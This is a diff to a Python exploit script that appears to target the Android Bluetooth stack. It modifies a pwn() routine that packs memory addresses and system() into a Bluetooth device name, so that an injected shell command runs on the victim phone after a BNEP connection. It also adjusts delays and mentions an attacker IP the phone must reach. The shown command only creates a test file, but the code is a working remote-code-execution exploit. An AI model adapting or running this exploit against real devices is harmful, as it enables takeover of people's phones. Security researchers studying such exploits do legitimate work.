@@ -23,7 +23,7 @@ BLUETOOTH_BSS_SOME_VAR_OFFSET = 0x7f67d
 
 MAX_BT_NAME = 0xf5
 
-# Payload details
+# Payload details (attacker IP should be accessible over the internet for the victim phone)
 SHELL_SCRIPT = b'touch /data/local/tmp/test'
 
 
@@ -120,10 +120,9 @@ def pwn(src_hci, dst, bluetooth_default_bss_base, system_addr, acl_name_addr, li
     # Gen new BDADDR, so that the new BT name will be cached
     src = set_rand_bdaddr(src_hci)
     
-    ptr0 = 0x41414141
-    ptr1 = 0x43434343
+    ptr0 = acl_name_addr
 
-    payload =  struct.pack('<IIIIII', 0x41411722, ptr1, system_addr, acl_name_addr, ptr1, system_addr) + b'";\n' + SHELL_SCRIPT + b'\n#'
+    payload = struct.pack('<III', 0xAAAA1722, 0x41414141, system_addr)  + b'";\n' + SHELL_SCRIPT + b'\n#'
 
 
     log.info("system    0x%08x" % system_addr)
@@ -135,9 +134,11 @@ def pwn(src_hci, dst, bluetooth_default_bss_base, system_addr, acl_name_addr, li
     
     # Puts payload into a known bss location (once we create a BNEP connection).
     set_bt_name(payload, src_hci, src, dst)
+    #prog = log.progress('Set name to '+payload)
+    #time.sleep(30)
 
     prog = log.progress('Connecting to BNEP again')
-    time.sleep(20)
+    time.sleep(1)
 
     bnep = bluetooth.BluetoothSocket(bluetooth.L2CAP)
     bnep.bind((src, 0))
